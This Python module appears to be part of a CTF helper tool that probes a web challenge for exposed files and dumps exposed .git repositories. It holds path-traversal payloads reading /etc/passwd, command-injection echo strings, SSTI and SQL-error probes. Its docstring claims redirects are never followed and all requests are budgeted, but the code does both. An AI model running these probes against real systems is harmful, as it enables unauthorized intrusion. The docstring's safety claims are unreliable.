# -*- coding: utf-8 -*-
"""Web 自动化解题（只读取证链）。

定位：给定一个 CTF Web 题地址，按固定顺序做可复现的只读探测，最后给出
「命中了什么、拿到了哪些 flag、下一步该手工做什么」三件事。

硬边界（与全局安全设计一致，不提供开关）：
- 只用 GET，只访问与输入同 scheme+host+port 的地址，不存在跨站请求
- 不跟随重定向（3xx 原样记录），不携带 Cookie 之外的任何凭据
- 全局请求预算 + 最小间隔 0.5 秒（约 2 次/秒），超时/取消立即收手
- 不写数据、不上传、不爆破口令、不导库、不执行系统命令
- 命中判定以内容特征为准，状态码只做参考（软 404 会骗人）

所有 payload 都是「读」或「算术回显」级别，用于判断注入点是否存在，
不做利用链落地。
"""
import json
import math
import os
import random
import re
import ssl
import string
import threading
import time
import uuid
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote, unquote, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import HTTPRedirectHandler, HTTPSHandler, Request, build_opener

from .common import REPORTS_DIR, scan_flags_text, looks_like_code_flag
from .versioning import APP_VERSION

MAX_BODY = 256 * 1024
MIN_INTERVAL = 0.5
# HTTP Header 仅允许 latin-1 编码，产品名使用 ASCII 转写。
UA = "MoHe-CTF/%s (authorized CTF use only)" % APP_VERSION
BLOCK_STATUS = (401, 403, 406, 429, 503)


class AutoStop(Exception):
    """内部停止信号：预算用尽、超时或用户取消。"""


class _NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = build_opener(_NoRedirect(), HTTPSHandler(context=ssl.create_default_context()))


class Budget(object):
    """请求预算 + 限速 + 截止时间。"""

    def __init__(self, max_requests=160, min_interval=MIN_INTERVAL, deadline=None,
                 cancel_event=None):
        self.max_requests = int(max_requests)
        self.min_interval = float(min_interval)
        self.deadline = deadline
        self.cancel_event = cancel_event
        self.used = 0
        self._last = 0.0
        self.log = []

    def _wait(self, seconds):
        end = time.monotonic() + seconds
        while True:
            if self.cancel_event is not None and self.cancel_event.is_set():
                raise AutoStop("已取消")
            left = end - time.monotonic()
            if left <= 0:
                return
            if self.cancel_event is not None:
                self.cancel_event.wait(min(0.1, left))
            else:
                time.sleep(min(0.1, left))

    def take(self):
        if self.cancel_event is not None and self.cancel_event.is_set():
            raise AutoStop("已取消")
        if self.deadline is not None and time.monotonic() >= self.deadline:
            raise AutoStop("时间预算用尽")
        if self.used >= self.max_requests:
            raise AutoStop("请求预算用尽（%d 次）" % self.max_requests)
        gap = time.monotonic() - self._last
        if gap < self.min_interval:
            self._wait(self.min_interval - gap)
        if self.deadline is not None and time.monotonic() >= self.deadline:
            raise AutoStop("时间预算用尽")
        self.used += 1
        self._last = time.monotonic()


def _origin(url):
    p = urlsplit(url)
    return urlunsplit((p.scheme, p.netloc, "", "", ""))


def _base_root(url):
    """去掉查询串的路径根：敏感文件与目录探测必须挂在真正的路径上，
    否则 base + '/x' 会把 '?id=1' 拼进路径，全部命中同一页面。"""
    p = urlsplit(url)
    return urlunsplit((p.scheme, p.netloc, p.path or "/", "", ""))


def _safe_url(url):
    """只接受 http/https 且带主机名的绝对 URL。"""
    if not isinstance(url, str) or len(url) > 2048:
        raise ValueError("URL 非法")
    p = urlsplit(url.strip())
    if p.scheme not in ("http", "https") or not p.hostname:
        raise ValueError("只接受 http/https 绝对地址")
    if p.username or p.password:
        raise ValueError("不接受带凭据的 URL")
    return urlunsplit((p.scheme, p.netloc, p.path or "/", p.query, ""))


def _same_origin(base, target):
    return _origin(base).lower() == _origin(target).lower()


def fetch(url, base, budget, timeout=8.0, referer=None):
    """单次 GET，同源 3xx 最多跟随 3 跳。返回 dict；出错写 error 字段而不是抛异常。"""
    if not _same_origin(base, url):
        raise ValueError("跨源请求被拒绝：" + url)
    budget.take()
    req = Request(url, method="GET")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "text/html,application/json,text/plain,*/*")
    if referer:
        req.add_header("Referer", referer)
    started = time.time()
    redirects = []
    cur = url
    for _hop in range(4):
        try:
            with _OPENER.open(req, timeout=timeout) as resp:
                raw = resp.read(MAX_BODY)
                res = {
                    "url": cur, "status": resp.status, "headers": dict(resp.headers.items()),
                    "body": raw, "error": "", "elapsed": round(time.time() - started, 3),
                }
                if redirects:
                    res["redirects"] = redirects
                return res
        except HTTPError as exc:
            hdrs = dict(exc.headers.items()) if exc.headers else {}
            loc = hdrs.get("Location") or hdrs.get("location")
            # 同源 3xx：跟随（保留查询串由服务端 Location 决定），跨源一律不跟
            if exc.code in (301, 302, 303, 307, 308) and loc and _hop < 3:
                nxt = urljoin(cur, loc)
                if _same_origin(base, nxt):
                    redirects.append({"from": cur, "status": exc.code, "to": nxt})
                    try:
                        exc.read()
                    except Exception:
                        pass
                    cur = nxt
                    req = Request(cur, method="GET")
                    req.add_header("User-Agent", UA)
                    req.add_header("Accept", "text/html,application/json,text/plain,*/*")
                    if referer:
                        req.add_header("Referer", referer)
                    budget.take()
                    continue
            try:
                raw = exc.read(MAX_BODY)
            except Exception:
                raw = b""
            res = {
                "url": cur, "status": exc.code, "headers": hdrs,
                "body": raw, "error": "", "elapsed": round(time.time() - started, 3),
            }
            if redirects:
                res["redirects"] = redirects
            return res
        except (URLError, OSError, ssl.SSLError, ValueError) as exc:
            res = {"url": cur, "status": 0, "headers": {}, "body": b"",
                    "error": "%s: %s" % (type(exc).__name__, exc),
                    "elapsed": round(time.time() - started, 3)}
            if redirects:
                res["redirects"] = redirects
            return res
    return {"url": cur, "status": 0, "headers": {}, "body": b"", "error": "重定向过多"}


def text_of(item):
    body = item.get("body") or b""
    try:
        return body.decode("utf-8", "replace")
    except Exception:
        return ""


def _ctype(item):
    for k, v in (item.get("headers") or {}).items():
        if k.lower() == "content-type":
            return v.lower()
    return ""


def collect_flags(text):
    hits = []
    try:
        hits.extend(scan_flags_text(text))
    except Exception:
        pass
    for mo in re.finditer(r"(?i)\b(?:flag|ctf|key|passwd|password)\s*\{[^{}\r\n]{2,80}\}", text):
        hits.append(mo.group(0))
    for mo in re.finditer(r"(?i)\b[A-Za-z0-9_]{2,20}\{[ -~]{4,80}\}", text):
        cand = mo.group(0)
        if re.search(r"(?i)(flag|ctf|key|sec)", cand.split("{")[0]):
            hits.append(cand)
    uniq = []
    for h in hits:
        h = str(h).strip()
        # 压缩 JS/CSS 里 try{a=b} / flag{Wt=null} 这类代码片段形状和 flag 一样，
        # 让它们混进来会白占提交配额，这里在收集口再筛一遍。
        if looks_like_code_flag(h):
            continue
        if 4 <= len(h) <= 200 and h not in uniq:
            uniq.append(h)
    return uniq


# ---------------------------------------------------------------------------
# 敏感路径表：路径 -> (标签, 判定函数)
# 判定函数收 (状态码, 正文 bytes, 正文文本, content-type) 返回 True/False
# ---------------------------------------------------------------------------
def _sig_git_head(status, raw, text, ctype):
    return bool(re.match(r"^(ref:\s*refs/|[0-9a-f]{40})", text.strip()))


def _sig_git_config(status, raw, text, ctype):
    return "[core]" in text and "repositoryformatversion" in text


def _sig_svn(status, raw, text, ctype):
    return bool(re.match(r"^\d+\s*$", text.strip()[:20])) or text.startswith("dir\n")


def _sig_dsstore(status, raw, text, ctype):
    return b"Bud1" in raw[:8]


def _sig_zip(status, raw, text, ctype):
    head = raw[:4]
    return head in (b"PK\x03\x04", b"PK\x05\x06", b"PK\x07\x08")


def _sig_env(status, raw, text, ctype):
    return bool(re.search(r"(?m)^(APP_|DB_|SECRET|API_|REDIS_|MYSQL_|MAIL_|AWS_)[A-Z0-9_]*\s*=", text))


def _sig_phpinfo(status, raw, text, ctype):
    return "PHP Version" in text or "phpinfo()" in text


def _sig_php_src(status, raw, text, ctype):
    return "<?php" in text


def _sig_web_xml(status, raw, text, ctype):
    return "<web-app" in text


def _sig_actuator(status, raw, text, ctype):
    return "propertySources" in text or '"activeProfiles"' in text


def _sig_history(status, raw, text, ctype):
    hits = len(re.findall(r"(?m)^\s*(?:sudo|ls|cd|cat|vim|nano|python|wget|curl|mysql)\b", text))
    return hits >= 2


def _sig_robots(status, raw, text, ctype):
    return bool(re.search(r"(?im)^\s*(user-agent|disallow|allow|sitemap)\s*:", text))


def _sig_sitemap(status, raw, text, ctype):
    return "<urlset" in text or "<sitemapindex" in text


def _sig_any_text(status, raw, text, ctype):
    return status == 200 and len(raw) > 0


def _sig_has_flag(status, raw, text, ctype):
    return bool(collect_flags(text))


SENSITIVE = [
    ("robots.txt", "robots 声明（可能泄露隐藏目录）", _sig_robots),
    ("sitemap.xml", "站点地图（可能列出隐藏页面）", _sig_sitemap),
    (".git/HEAD", "Git 仓库暴露（可 git-dumper 拉源码）", _sig_git_head),
    (".git/config", "Git 配置泄露（含远端地址/分支）", _sig_git_config),
    (".svn/entries", "SVN 元数据暴露", _sig_svn),
    (".DS_Store", "macOS 目录索引（泄露同名文件列表）", _sig_dsstore),
    (".env", "环境变量泄露（数据库/密钥）", _sig_env),
    (".env.bak", "环境变量备份泄露", _sig_env),
    (".bash_history", "命令历史泄露", _sig_history),
    ("www.zip", "整站源码压缩包", _sig_zip),
    ("web.zip", "整站源码压缩包", _sig_zip),
    ("wwwroot.zip", "整站源码压缩包", _sig_zip),
    ("backup.zip", "备份压缩包", _sig_zip),
    ("src.zip", "源码压缩包", _sig_zip),
    ("html.zip", "整站源码压缩包", _sig_zip),
    ("index.php.bak", "首页源码备份", _sig_php_src),
    ("index.php~", "编辑器临时文件", _sig_php_src),
    ("config.php.bak", "配置源码备份", _sig_php_src),
    ("flag.php", "直接放 flag 的脚本（正文含 flag 才判命中）", _sig_has_flag),
    ("flag.txt", "直接放 flag 的文件（正文含 flag 才判命中）", _sig_has_flag),
    ("phpinfo.php", "phpinfo 暴露（泄露路径/配置）", _sig_phpinfo),
    ("info.php", "phpinfo 暴露", _sig_phpinfo),
    ("WEB-INF/web.xml", "Java 应用配置泄露", _sig_web_xml),
    ("actuator/env", "Spring Boot actuator 暴露", _sig_actuator),
    ("actuator/heapdump", "Spring 堆转储（可内存取证）", _sig_zip),
]

# 目录猜测：只保留 CTF 高频且不具破坏性的少量词
DIR_WORDS_AUTO = [
    "admin", "login", "upload", "uploads", "backup", "bak", "src", "source", "www", "test",
    "flag", "api", "console", "debug", "phpmyadmin", "server-status", "static", "files",
    "download", "include", "inc", "tmp", "logs", "db", "data", ".git", "notes", "README.md",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
]
TRAVERSAL_MARKS = ("root:x:0:0", "root:*:0:0", "daemon:x:", "[fonts]", "[extensions]")
PHP_FILTER_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")

# 用「不常见的乘积」当指纹，避免页面里本来就有 49 造成误判
SSTI_PAYLOADS = ["{{191*7919}}", "${191*7919}", "<%=191*7919%>", "#{191*7919}", "{{7*'7'}}"]
SSTI_EXPECT = {"{{7*'7'}}": "7777777", "default": "1512529"}
CMDI_PAYLOADS = [";echo CTFBOX9137", "|echo CTFBOX9137", "$(echo CTFBOX9137)",
                 "`echo CTFBOX9137`", "&&echo CTFBOX9137"]
CMDI_MARK = "CTFBOX9137"
SQLI_MARKS = ("you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
              "sqlite3.", "quoted string not properly terminated", "ora-0", "jdbc", "syntax error at or near")


def _baseline(base, budget, log):
    """软 404 基线：两个随机不存在路径的状态码与长度。"""
    token = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    root = base.rstrip("/")
    targets = [root + "/ctfbox_nx_%s.txt" % token, root + "/%s/ctfbox_nx_%s" % (token, token)]
    out = []
    for name in targets:
        item = fetch(name, base, budget)
        out.append((item.get("status"), len(item.get("body") or b"")))
        log("[auto] 软 404 基线 %s -> %s %d 字节" % (name, item.get("status"), len(item.get("body") or b"")))
    return out


def _soft(item, baseline):
    st = item.get("status")
    ln = len(item.get("body") or b"")
    for bst, bln in baseline:
        if st == bst and abs(ln - bln) <= max(16, int(bln * 0.05)):
            return True
    return False


def probe_sensitive(base, budget, log, baseline):
    findings = []
    for path, label, sig in SENSITIVE:
        url = base.rstrip("/") + "/" + path
        try:
            item = fetch(url, base, budget, referer=base)
        except AutoStop:
            raise
        except Exception as exc:
            log("[auto] %s 请求失败：%s" % (path, exc))
            continue
        st = item.get("status")
        raw = item.get("body") or b""
        text = text_of(item)
        if not st or st in (404, 410):
            continue
        if st in BLOCK_STATUS:
            findings.append({"path": path, "label": label, "status": st, "hit": False,
                             "note": "被拒绝，路径可能真实存在（值得手工复核）"})
            log("[auto] %d %s（被拒绝，可能真实存在）" % (st, path))
            continue
        hit = False
        try:
            hit = bool(sig(st, raw, text, _ctype(item)))
        except Exception:
            hit = False
        if hit and _soft(item, baseline):
            log("[auto] %s 疑似软 404，按未命中处理" % path)
            continue
        if not hit:
            continue
        flags = collect_flags(text)
        findings.append({"path": path, "label": label, "status": st, "hit": True,
                         "bytes": len(raw), "flags": flags, "note": _snippet(text)})
        log("[auto] 命中 %d %s —— %s%s" % (st, path, label, ("；flag: " + ", ".join(flags)) if flags else ""))
        if flags:
            # flag 优先：已经拿到答案，不再把剩余敏感路径跑完
            log("[auto] 敏感路径已读到 flag，停止后续路径探测")
            return findings
    return findings


def _snippet(text, limit=180):
    body = re.sub(r"(?is)<script.*?</script>|<style.*?</style>", " ", text)
    body = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", body)).strip()
    return body[:limit]


def _replace_param(url, name, value):
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    new = [(k, value if k == name else v) for k, v in pairs]
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new), ""))


def test_params(url, budget, log):
    """对 URL 查询串里每个参数做只读注入探测。"""
    pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    if not pairs:
        return {"params": [], "results": []}
    results = []
    names = [k for k, _ in pairs]
    for name in names[:6]:
        log("[auto] 探测参数 %s" % name)
        cur = dict(pairs).get(name, "1") or "1"
        # SQL 报错：只在原值后补一个单引号，不构造联合查询
        target = _replace_param(url, name, cur + "'")
        item = fetch(target, url, budget, referer=url)
        text = text_of(item).lower()
        sqli = [m for m in SQLI_MARKS if m in text]
        if sqli:
            results.append({"param": name, "type": "sqli-error", "status": item.get("status"),
                            "evidence": sqli[0]})
            log("[auto] %s 出现 SQL 报错特征：%s" % (name, sqli[0]))
        # 路径穿越 / LFI
        for payload in TRAVERSAL_PAYLOADS:
            item = fetch(_replace_param(url, name, payload), url, budget, referer=url)
            text = text_of(item)
            mark = next((m for m in TRAVERSAL_MARKS if m in text), None)
            if mark:
                results.append({"param": name, "type": "lfi", "payload": payload,
                                "status": item.get("status"), "evidence": mark,
                                "flags": collect_flags(text)})
                log("[auto] %s 命中路径穿越/文件读取：%s -> %s" % (name, payload, mark))
                break
            if item.get("status") == 200 and len(text) < 20000:
                for blob in PHP_FILTER_RE.findall(text):
                    try:
                        import base64
                        dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
                        if b"<?php" in dec or b"<?=" in dec:
                            results.append({"param": name, "type": "lfi-php-filter",
                                            "payload": payload, "evidence": "base64 PHP 源码"})
                            log("[auto] %s php://filter 读到了 PHP 源码" % name)
                            break
                    except Exception:
                        continue
        # SSTI：先用两个不同算式交叉确认，排除页面本来就含 "49" 的巧合
        ssti_hit = None
        first = fetch(_replace_param(url, name, "{{7*7}}"), url, budget, referer=url)
        if "49" in text_of(first):
            second = fetch(_replace_param(url, name, "{{7*8}}"), url, budget, referer=url)
            if "56" in text_of(second):
                ssti_hit = ("{{7*7}}/{{7*8}}", "49/56")
        if not ssti_hit:
            for payload in ("${7*7}", "<%=7*7%>", "#{7*7}"):
                item = fetch(_replace_param(url, name, payload), url, budget, referer=url)
                if "49" in text_of(item):
                    ssti_hit = (payload, "49")
                    break
        if ssti_hit:
            results.append({"param": name, "type": "ssti", "payload": ssti_hit[0],
                            "evidence": ssti_hit[1]})
            log("[auto] %s 命中模板注入：%s -> %s" % (name, ssti_hit[0], ssti_hit[1]))

        # 命令注入：先确认页面是不是只在「回显输入」，再判断是否真的执行
        neutral = fetch(_replace_param(url, name, CMDI_MARK), url, budget, referer=url)
        reflected = CMDI_MARK in text_of(neutral)
        if reflected:
            log("[auto] %s 会把参数原样回显，命令注入无法据此判定（需手工带外确认）" % name)
            results.append({"param": name, "type": "reflected", "evidence": CMDI_MARK,
                            "note": "页面回显输入，不等于命令执行"})
        else:
            for payload in CMDI_PAYLOADS:
                item = fetch(_replace_param(url, name, payload), url, budget, referer=url)
                if CMDI_MARK in text_of(item):
                    results.append({"param": name, "type": "cmdi", "payload": payload,
                                    "status": item.get("status"), "evidence": CMDI_MARK})
                    log("[auto] %s 命中命令注入（仅回显标记）：%s" % (name, payload))
                    break
    return {"params": names, "results": results}


def parse_robots(text):
    out = []
    for line in text.splitlines():
        mo = re.match(r"(?i)^\s*disallow\s*:\s*(.+)$", line)
        if mo:
            path = mo.group(1).strip()
            if path and path != "/" and not path.startswith("http") and len(path) < 120:
                out.append(path.lstrip("/"))
    return out[:10]


def probe_dirs(base, budget, log, baseline):
    hits = []
    for word in DIR_WORDS_AUTO:
        url = base.rstrip("/") + "/" + word + "/"
        item = fetch(url, base, budget, referer=base)
        st = item.get("status")
        ln = len(item.get("body") or b"")
        if st in (200, 301, 302, 401, 403) and not _soft(item, baseline):
            hits.append({"dir": word, "status": st, "bytes": ln})
            log("[auto] 目录线索 %s -> %d（%d 字节）" % (word, st, ln))
    return hits


def build_hints(finding_list, param_results, flaglist):
    hints = []
    kinds = {f["path"] for f in finding_list if f.get("hit")}
    types = {p["type"] for p in param_results}
    if ".git/HEAD" in kinds or ".git/config" in kinds:
        hints.append("确认 .git 暴露后，用面板里的 GitHack 或 git-dumper 拉取源码，重点看历史提交与未跟踪文件。")
    if any(k.endswith((".zip",)) for k in kinds):
        hints.append("下载压缩包后直接当源码审计：先搜 flag/密码/数据库配置，再找上传与包含点。")
    if ".env" in kinds:
        hints.append(".env 里通常有数据库口令与 APP_KEY：前者试数据库，后者可试 Laravel 反序列化。")
    if "lfi" in types or "lfi-php-filter" in types:
        hints.append("文件读取已成立：试读 /proc/self/environ、日志文件包含，或用 php://filter 逐段扒源码。")
    if "ssti" in types:
        hints.append("模板注入已成立：按引擎走 Twig/Jinja2 的 RCE 链，先确认过滤字符再动手。")
    if "cmdi" in types:
        hints.append("命令注入已成立：先用无回显方式（写文件/带外）确认通道，再取 flag。")
    if "sqli-error" in types:
        hints.append("SQL 报错注入可用：先从 information_schema 摸库表，再定位 flag 所在表。")
    if not hints and flaglist:
        hints.append("已直接拿到 flag，回填即可。")
    if not hints:
        hints.append("未发现明确入口：手工看一遍页面参数、Cookie、JS 注释与响应头，再用目录工具扩词表。")
    return hints


def _git_dump_source(base, log):
    """v4.0.4：检测 .git 暴露后，逐对象 dump commit/tree/blob 恢复源码并扫 flag。

    此前只提示"可用 git-dumper 拉源码"却不自动执行，导致 Git 泄露类 Web 题漏解。
    仅只读下载，不执行任何拉到的代码。
    """
    import zlib
    import requests
    root = base.rstrip("/")
    s = requests.Session()
    s.headers.update({"User-Agent": "MoHe-CTF-WebAuto/%s" % APP_VERSION})

    def _get(path, timeout=12):
        try:
            return s.get(root + path, timeout=timeout)
        except Exception:
            return None

    head = _get("/.git/HEAD")
    if not head or head.status_code != 200 or b"ref:" not in head.content:
        return None
    log("[auto] 检测到 .git 暴露，逐对象 dump 源码 ...")
    files, flags = [], []

    def _obj(sha):
        r = _get("/.git/objects/%s/%s" % (sha[:2], sha[2:]))
        if not r or r.status_code != 200:
            return None
        try:
            return zlib.decompress(r.content)
        except Exception:
            return None

    def _walk(sha, prefix="", depth=0):
        if depth > 6 or len(files) > 400:
            return
        raw = _obj(sha)
        if not raw:
            return
        kind = raw.split(b" ", 1)[0].decode("utf-8", "replace")
        if kind == "commit":
            text = raw.split(b"\x00", 1)[-1].decode("utf-8", "replace")
            m = re.search(r"tree ([0-9a-f]{40})", text)
            if m:
                _walk(m.group(1), prefix, depth + 1)
        elif kind == "tree":
            body = raw.split(b"\x00", 1)[-1]
            i = 0
            while i < len(body):
                try:
                    j = body.index(b"\x00", i)
                except ValueError:
                    break
                mode, _, name = body[i:j].partition(b" ")
                csha = body[j + 1:j + 21].hex()
                nm = name.decode("utf-8", "replace")
                if nm != ".git":
                    if mode.decode("utf-8", "replace").startswith("40000"):
                        _walk(csha, prefix + nm + "/", depth + 1)
                    else:
                        blob = _obj(csha)
                        content = blob.split(b"\x00", 1)[-1] if blob else b""
                        files.append({"path": prefix + nm, "size": len(content)})
                        txt = content.decode("utf-8", "replace")
                        for fl in collect_flags(txt):
                            if fl not in flags:
                                flags.append(fl)
                i = j + 21

    commit = None
    logs = _get("/.git/logs/HEAD")
    if logs and logs.status_code == 200:
        m = re.search(rb"([0-9a-f]{40}) [^ ]+ commit", logs.content)
        if m:
            commit = m.group(1).decode()
    if not commit:
        ref = head.content.decode("utf-8", "replace").split("ref:")[-1].strip()
        rf = _get("/.git/" + ref)
        if rf and rf.status_code == 200:
            commit = rf.content.decode("utf-8", "replace").strip()
    if commit:
        _walk(commit)
    log("[auto] git dump：恢复 %d 个文件，命中 flag %d 个" % (len(files), len(flags)))
    return {"commit": commit, "files": files[:200], "flags": flags}


def auto_solve(url, log=print, max_requests=160, max_seconds=240, cancel_event=None,
               deadline=None, stop_on_flag=True):
    """主入口。返回 dict（可直接 json 序列化）。"""
    url = _safe_url(url)
    if deadline is None:
        deadline = time.monotonic() + float(max_seconds or 240)
    budget = Budget(max_requests=max_requests, deadline=deadline, cancel_event=cancel_event)
    started = time.strftime("%Y-%m-%dT%H:%M:%S")
    result = {
        "url": url, "started": started, "requests": 0, "fingerprint": {},
        "sensitive": [], "dirs": [], "params": {"params": [], "results": []},
        "flags": [], "hints": [], "stopped": "",
    }
    log("[auto] 目标 %s；只读、同源、约 2 次/秒，上限 %d 次请求或 %d 秒。"
        % (url, max_requests, int(max_seconds or 240)))
    try:
        root_path = _base_root(url)
        base_item = fetch(url, url, budget, referer=url)
        text = text_of(base_item)
        title = ""
        mo = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
        if mo:
            title = re.sub(r"\s+", " ", mo.group(1)).strip()[:120]
        headers = {k.lower(): v for k, v in (base_item.get("headers") or {}).items()}
        forms = re.findall(r"(?is)<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>", text)[:6]
        inputs = re.findall(r"(?is)<input[^>]*name=[\"']([^\"']+)[\"']", text)[:12]
        fp = {
            "status": base_item.get("status"), "title": title,
            "server": headers.get("server", ""), "powered_by": headers.get("x-powered-by", ""),
            "content_type": headers.get("content-type", ""), "length": len(text),
            "set_cookie": headers.get("set-cookie", ""), "forms": forms, "inputs": inputs,
            "app_hint": _app_hint(headers, text),
        }
        result["fingerprint"] = fp
        log("[auto] 指纹 %s %s | %s | %s" % (fp["status"], title or "(无标题)",
                                         fp["server"] or "-", fp["app_hint"] or "-"))
        if base_item.get("error"):
            log("[auto] 首页请求失败：%s" % base_item["error"])
        flags = collect_flags(text)
        if flags:
            result["flags"].extend(flags)
        baseline = _baseline(root_path, budget, log)

        robots = fetch(root_path.rstrip("/") + "/robots.txt", url, budget, referer=url)
        rtext = text_of(robots)
        if robots.get("status") == 200 and _sig_robots(*_sig_args(robots, rtext)):
            disclosed = parse_robots(rtext)
            result["sensitive"].append({"path": "robots.txt", "label": "robots 声明",
                                        "status": 200, "hit": True,
                                        "note": "泄露路径：" + ", ".join(disclosed) if disclosed else "无 Disallow 条目"})
            log("[auto] robots.txt 可读；条目：%s" % (", ".join(disclosed) or "无"))
            for rel in disclosed:
                rel = rel.strip().lstrip("/")
                if not rel or ".." in rel or not re.fullmatch(r"[A-Za-z0-9_.\-/]+", rel):
                    continue
                item = fetch(root_path.rstrip("/") + "/" + rel, url, budget, referer=url)
                if item.get("status") in (200, 301, 401, 403):
                    result["sensitive"].append({"path": rel, "label": "robots 指向的路径",
                                                "status": item.get("status"), "hit": True,
                                                "note": _snippet(text_of(item)),
                                                "flags": collect_flags(text_of(item))})

        result["sensitive"].extend(probe_sensitive(root_path, budget, log, baseline))
        for f in result["sensitive"]:
            result["flags"].extend(f.get("flags") or [])
        # v4.0.4：检测到 .git 暴露 → 自动 dump 源码并扫 flag（Git 泄露类 Web 题）
        try:
            git_res = _git_dump_source(root_path, log)
            if git_res:
                result["git_dump"] = git_res
                result["flags"].extend(git_res.get("flags") or [])
        except Exception as _e:
            log("[auto] git dump 异常：%s" % _e)
        # flag 优先：敏感路径已拿到 flag 就跳过目录词表与参数弱点，省掉几十次请求
        if result["flags"] and stop_on_flag:
            log("[auto] 已拿到 flag，跳过目录探测与参数弱点（完整模式可传 stop_on_flag=False）")
        else:
            result["dirs"] = probe_dirs(root_path, budget, log, baseline)
            result["params"] = test_params(url, budget, log)
            for p in result["params"]["results"]:
                result["flags"].extend(p.get("flags") or [])
    except AutoStop as exc:
        result["stopped"] = str(exc)
        log("[auto] 提前收手：%s" % exc)
    except Exception as exc:
        result["stopped"] = "%s: %s" % (type(exc).__name__, exc)
        log("[auto] 异常终止：%s" % result["stopped"])
    uniq = []
    for f in result["flags"]:
        if f not in uniq:
            uniq.append(f)
    result["flags"] = uniq
    hits = [f for f in result["sensitive"] if f.get("hit")]
    result["hints"] = build_hints(hits, result["params"]["results"], uniq)
    result["requests"] = budget.used
    result["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S")
    result["summary"] = _summary(result, hits)
    return result


def _sig_args(item, text):
    return (item.get("status"), item.get("body") or b"", text, _ctype(item))


def _app_hint(headers, text):
    low = text.lower()
    table = [
        ("php", "PHP"), ("thinkphp", "ThinkPHP"), ("laravel", "Laravel"),
        ("spring", "Spring Boot"), ("flask", "Flask"), ("jinja", "Jinja2"),
        ("django", "Django"), ("wordpress", "WordPress"), ("tomcat", "Tomcat"),
        ("jsessionid", "Java/Servlet"), ("shiro", "Shiro"), ("struts", "Struts2"),
        ("swagger", "Swagger"), ("grafana", "Grafana"),
    ]
    for token, label in table:
        if token in low or token in (headers.get("set-cookie", "") or "").lower():
            return label
    if headers.get("x-powered-by"):
        return headers["x-powered-by"]
    return ""


def _summary(result, hits):
    lines = []
    lines.append("目标 %s" % result["url"])
    if result["fingerprint"].get("title"):
        lines.append("标题：%s" % result["fingerprint"]["title"])
    if hits:
        lines.append("命中 %d 处：" % len(hits))
        for h in hits:
            lines.append("  - %s %s%s" % (h["path"], h.get("label", ""),
                                          ("；" + h["note"]) if h.get("note") else ""))
    else:
        lines.append("未命中内置敏感路径特征。")
    p = result["params"]["results"]
    if p:
        lines.append("参数弱点 %d 处：" % len(p))
        for x in p:
            lines.append("  - %s: %s（%s）" % (x["param"], x["type"], x.get("payload", "")))
    if result["flags"]:
        lines.append("FLAG：" + "; ".join(result["flags"]))
    if result.get("stopped"):
        lines.append("提前结束：" + result["stopped"])
    return "\n".join(lines)


def save_report(result):
    os.makedirs(REPORTS_DIR, exist_ok=True)
    name = "web_auto_" + time.strftime("%Y%m%d_%H%M%S") + "_" + uuid.uuid4().hex[:8] + ".json"
    path = os.path.abspath(os.path.join(REPORTS_DIR, name))
    with open(path, "w", encoding="utf-8") as fp:
        json.dump(result, fp, ensure_ascii=False, indent=2)
    return path
